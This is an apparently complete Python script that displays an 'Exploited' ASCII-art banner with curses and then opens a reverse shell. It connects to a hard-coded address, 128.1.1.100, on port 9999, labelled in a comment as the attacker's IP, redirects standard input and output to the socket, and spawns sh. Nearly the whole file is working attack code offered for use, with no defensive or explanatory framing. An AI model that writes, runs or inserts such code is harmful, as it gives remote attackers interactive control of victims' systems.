import sys
import socket
import os
import pty
import curses

# ASCII Art Display Code
def display_ascii_art():
    art = r"""
  ______                  _           _   _                _   
 |  ____|                | |         (_) | |              | |  
 | |__    __  __  _ __   | |   ___    _  | |_    ___    __| |  
 |  __|   \ \/ / | '_ \  | |  / _ \  | | | __|  / _ \  / _` |  
 | |____   >  <  | |_) | | | | (_) | | | | |_  |  __/ | (_| |  
 |______| /_/\_\ | .__/  |_|  \___/  |_|  \__|  \___|  \__,_|  
                 | |                                           
                 |_|                                           
    
    """
    stdscr = None
    try:
        stdscr = curses.initscr()
        curses.curs_set(0)
        sh, sw = stdscr.getmaxyx()  # Get height and width of window

        # Calculate position to center the art
        y = sh // 2 - len(art.splitlines()) // 2
        x = sw // 2 - max(len(line) for line in art.splitlines()) // 2

        # Display the ASCII art
        for i, line in enumerate(art.splitlines()):
            stdscr.addstr(y + i, x, line)
        stdscr.refresh()
        stdscr.getch()  # Wait for user input to exit
    except Exception as e:
        print(f"Error displaying ASCII art: {e}")
    finally:
        if stdscr:
            curses.endwin()

# Reverse Shell Setup
def reverse_shell():
    RHOST = "128.1.1.100"  # Replace with the attacker's IP
    RPORT = 9999  # Replace with the desired port

    try:
        # Create a socket and connect to the remote host
        s = socket.socket()
        s.connect((RHOST, RPORT))

        # Redirect input/output
        [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]

        # Spawn a shell
        pty.spawn("sh")
    except Exception as e:
        print(f"Error in reverse shell: {e}")
        sys.exit(1)

# Show ASCII art first, then start the reverse shell
display_ascii_art()
reverse_shell()
